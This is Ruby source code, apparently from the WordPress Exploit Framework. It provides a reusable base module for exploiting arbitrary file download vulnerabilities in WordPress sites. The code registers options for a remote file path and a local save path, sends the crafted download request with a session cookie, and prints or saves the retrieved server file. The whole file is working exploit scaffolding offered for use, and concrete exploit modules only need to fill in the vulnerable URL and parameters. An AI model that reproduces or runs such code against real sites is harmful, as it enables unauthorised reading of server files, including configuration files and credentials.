# Provides reusable functionality for file download modules.
module Wpxf::WordPress::FileDownload
  include Wpxf

  # Initialize a new instance of {FileDownload}
  def initialize
    super
    @info[:desc] = 'This module exploits a vulnerability which allows you to '\
                   'download any arbitrary file accessible by the user the web server is running as.'

    register_options([
      StringOption.new(
        name: 'remote_file',
        desc: "The path to the remote file (relative to #{working_directory})",
        required: true,
        default: default_remote_file_path
      ),
      StringOption.new(
        name: 'export_path',
        desc: 'The path to save the file to',
        required: export_path_required
      )
    ])
  end

  # @return [Boolean] true if the export path option is required.
  def export_path_required
    false
  end

  # @return [String] the working directory of the vulnerable file.
  def working_directory
    nil
  end

  # @return [String] the default remote file path.
  def default_remote_file_path
    nil
  end

  # @return [String] the URL of the vulnerable file used to download remote files.
  def downloader_url
    nil
  end

  # @return [Hash] the params to be used when requesting the download file.
  def download_request_params
    nil
  end

  # @return [Hash, String] the body to be use when requesting the download file.
  def download_request_body
    nil
  end

  # @return [Symbol] the HTTP method to use when requesting the download file.
  def download_request_method
    :get
  end

  # @return [String] the path to the remote file.
  def remote_file
    normalized_option_value('remote_file')
  end

  # @return [String] the path to save the file to.
  def export_path
    return nil if normalized_option_value('export_path').nil?
    File.expand_path normalized_option_value('export_path')
  end

  # Validate the contents of the requested file.
  # @param content [String] the file contents.
  # @return [Boolean] true if valid.
  def validate_content(content)
    true
  end

  # A task to run before the download starts.
  # @return [Boolean] true if pre-download operations were successful.
  def before_download
    true
  end

  # Run the module.
  # @return [Boolean] true if successful.
  def run
    validate_implementation

    return false unless super
    return false unless before_download

    res = request_file
    return false unless validate_result(res) && validate_content(res.body)

    if export_path.nil?
      emit_success "Result: \n#{res.body}"
    else
      emit_success "Downloaded file to #{export_path}"
    end

    true
  end

  private

  def validate_implementation
    raise 'A value must be specified for #working_directory' unless working_directory
  end

  def validate_result(res)
    if res.nil? || res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    return true unless res.code != 200

    emit_error "Server responded with code #{res.code}"
    false
  end

  def core_request_opts
    {
      method: download_request_method,
      url: downloader_url,
      params: download_request_params,
      body: download_request_body,
      cookie: session_cookie
    }
  end

  def request_file
    if export_path.nil?
      emit_info 'Requesting file...'
      return execute_request(core_request_opts)
    else
      emit_info 'Downloading file...'
      return download_file(core_request_opts.merge(local_filename: export_path))
    end
  end
end
